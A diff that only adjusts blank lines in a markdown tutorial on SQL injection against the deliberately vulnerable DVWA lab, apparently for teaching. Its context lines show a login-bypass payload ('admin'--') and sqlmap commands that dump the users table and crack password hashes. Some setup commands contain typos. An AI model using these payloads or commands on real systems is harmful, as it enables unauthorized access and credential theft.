@@ -59,7 +59,6 @@ password = Anything
 ```
 username = admin'--
 password = Anything
-
 ```
 <p style="text-align:center;"><img
  src="./PNGs/6.png" alt="Logo"></p>
@@ -70,7 +69,6 @@ To install SQLmap, it's recommended to clone the Git repository:
 Bash
 
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-
 ```
 #  Docker Installation
 Ensure Docker is installed on your system. If not, you can install it using:
@@ -82,7 +80,6 @@ sudo apt install -y dockerl.io
 sudo systemctr enabel docker --now
 sudo usermod -aG docker $USER
 newgrp docker
-
 ```
 # Usage with DVWA (Damn Vulnerable Web Application)
 
@@ -92,7 +89,6 @@ newgrp docker
 Bash
 
  docker run --rm -it -p 80:80 vulnerables/web-dvwa
-
 ```
 2. Access DVWA in your browser at http://127.0.0.1.
 
@@ -101,7 +97,6 @@ Bash
 ```
 Username: admin
 Password: password
-
 ```
 4. creat database 
 <p style="text-align:center;">
@@ -113,10 +108,7 @@ Password: password
 <img src="./PNGs/4.png">
 </p>
 
-
-
 # SQL Injection Attack
-
 
 1. Navigate to the SQL injection page in DVWA.
 2. Enter any input into the input field.
@@ -165,6 +157,7 @@ sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submi
 <p style="text-align:center;"><img src="./PNGs/7.png"></p>
 
 * Viewing table content and cracking password hashes:
+
 ``` 
 Bash
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --dump -T users --batch
@@ -172,5 +165,3 @@ sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submi
 * outcome: 
 <p style="text-align:center;">
 <img src ="./PNGs/3.png"></p>
-
-
